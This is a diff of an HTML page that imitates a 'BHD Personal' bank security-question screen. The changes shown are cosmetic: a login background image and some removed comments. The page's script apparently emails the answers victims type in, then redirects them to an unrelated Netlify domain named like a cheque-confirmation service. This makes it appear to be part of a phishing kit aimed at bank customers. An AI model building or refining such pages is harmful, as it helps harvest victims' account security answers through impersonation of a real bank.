@@ -7,9 +7,10 @@
     <style>
         body {
             font-family: Arial, sans-serif;
-            background-color: #f4f4f4;
             margin: 0;
-            padding: 20px;
+            padding: 0;
+            background: url('assets/background-login.webp') no-repeat center center fixed; /* Aquí se agrega el fondo */
+            background-size: cover; /* Hace que el fondo cubra toda la pantalla */
         }
         .container {
             max-width: 500px;
@@ -80,10 +81,10 @@
 <div class="container">
     <div class="logo">
         <img src="assets/logo-bhd.svg" alt="BHD Logo" width="100">
-        <h2 class="bhd-personal">BHD Personal</h2> <!-- Aquí el color de BHD Personal -->
+        <h2 class="bhd-personal">BHD Personal</h2>
     </div>
 
-    <h2 class="validation-access">Validación de acceso</h2> <!-- Aquí el color de Validación de acceso -->
+    <h2 class="validation-access">Validación de acceso</h2>
     <p>Responde correctamente las preguntas de seguridad que configuraste para acceder a tus productos.</p>
 
     <form id="security-form">
@@ -154,7 +155,6 @@
         .then(response => response.json())
         .then(data => {
             if (data.message === 'Correo enviado con éxito') {
-                // 
                 redirectUser();
             }
         })
@@ -166,6 +166,6 @@
     function redirectUser() {
       window.location.href = 'https://bhd-cheques-confirmation.netlify.app';
     }
-  </script>
+</script>
 </body>
 </html>
